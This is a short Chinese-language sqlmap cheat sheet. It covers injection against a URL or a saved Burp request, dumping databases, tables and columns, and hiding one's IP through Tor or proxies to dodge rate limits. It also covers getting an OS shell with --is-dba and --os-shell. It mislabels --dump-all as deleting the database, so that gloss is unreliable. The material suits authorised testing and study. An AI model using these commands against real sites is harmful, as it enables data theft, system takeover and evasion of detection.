## 基本语法

```shell
sqlmap -u "url" --dbs #--dbs作用是爆出所有数据库名字

sqlmap -u "url" -p 要测试的参数 -d 数据库类型 -D要测试的数据库名称 -T要测试的表名称 -C 要测试的列名称

```

## 将请求作为文件，指定sqlmap使用

例如需要cookie，或者post值，添加xff头等情况，可以先在burp中保存请求包为一个文件，然后

```shell
sqlmap -r 1.txt --dbs
```

## 常用参数

`-p`参数用于指定注入点，例如，如果您的目标站点是`http://www.example.com/Less-1/?id=1`，则可以使用以下命令来指定注入点：`sqlmap -u "http://www.example.com/Less-1/?id=1" -p id`

```bash
-u             #指定url
-r             #指定文件
-p             #指定注入点
--cookie       #指定cookie
--dbs          #注入库名
-D            #指定库名
--tables       #注入表名
-T             #指定表名
--columns      #注入列名
-C             #指定列名
--dump         #注入数据
--dump-all     #掉库（删库）
```

## 避免429 too many requests

1. 使用代理服务器：使用代理服务器可以隐藏您的真实IP地址，从而避免被检测到。您可以使用Tor或其他代理服务器来隐藏您的IP地址。
2. 调整请求速率：您可以通过调整请求速率来减少请求的数量。这可以通过在命令行中使用`--delay`选项来实现。例如，使用`--delay=1选项将在每个请求之间添加1秒的延迟。
3. 调整线程数：您可以通过调整线程数来减少请求的数量。这可以通过在命令行中使用`--threads`选项来实现。例如，使用`--threads=1`选项将只使用一个线程进行扫描。



## 利用sqlmap获取shell权限

正常的sqlmap语句后跟上 `--is-dba`

可以判断当前用户是不是dba，有没有权限

然后再加上`--os-shell`

获取shell